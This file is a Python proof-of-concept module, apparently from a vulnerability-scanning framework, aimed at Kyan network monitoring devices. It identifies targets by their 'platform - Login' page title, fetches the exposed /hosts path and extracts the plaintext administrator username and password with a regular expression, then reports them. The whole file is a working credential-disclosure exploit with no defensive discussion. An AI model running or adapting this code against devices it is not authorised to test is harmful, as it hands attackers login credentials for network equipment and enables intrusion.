# -*- coding:utf-8 -*-
# Kyan 网络监控设备 密码泄露

import re
from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def get_user(self, url):
        resp = self.requestUtil.get(url + "/hosts")
        if "UserName" in resp.text:
            return re.findall("UserName=(.*?)\nPassword=(.*?)\n", resp.text, re.DOTALL)[0]
        else:
            return False

    def fingerprint(self):
        try:
            if "platform - Login" in self.service.title:
                return True
        except:
            return False

    def poc(self):
        try:
            result = self.get_user(self.service.url)
            print(result)
            if result:
                return (
                    ["Kyan 网络监控设备 密码泄露", "用户名: %s<br>密码: %s" % (result[0], result[1])],
                    "%s[pw]%s" % (result[0], result[1]))
        except Exception as e:
            print(e)
            return []
